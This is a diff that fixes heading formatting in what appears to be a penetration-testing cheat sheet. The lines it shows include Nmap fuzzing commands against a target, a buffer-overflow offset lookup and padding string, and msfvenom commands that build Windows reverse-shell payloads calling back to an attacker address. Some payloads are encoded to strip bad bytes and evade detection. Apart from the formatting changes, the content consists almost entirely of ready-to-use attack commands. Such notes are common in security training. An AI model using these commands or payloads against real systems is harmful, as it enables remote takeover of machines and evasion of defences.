@@ -1,12 +1,12 @@
-#DEP and ASLR - Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR)
+# DEP and ASLR - Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR)
 
-##NMap Fuzzer List
+## NMap Fuzzer List
 https://nmap.org/nsedoc/categories/fuzzer.html
 
-##NMap HTTP Form Fuzzer
+## NMap HTTP Form Fuzzer
 nmap --script http-form-fuzzer --script-args 'http-form-fuzzer.targets={1={path=/},2={path=/register.html}}' -p 80 $ip
 
-##Nmap DNS Fuzzer
+## Nmap DNS Fuzzer
 nmap --script dns-fuzz --script-args timelimit=2h $ip -d
 
 
@@ -22,7 +22,7 @@ pattern_offset.rb -q 39694438
 buffer = "A" \* 2606 + "B" \* 4 + "C" \* 90
 
 
-** MSFVenom Payloads **
+**MSFVenom Payloads**
 msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
 msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=4444 -f exe -o shell_reverse.exe
 msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe
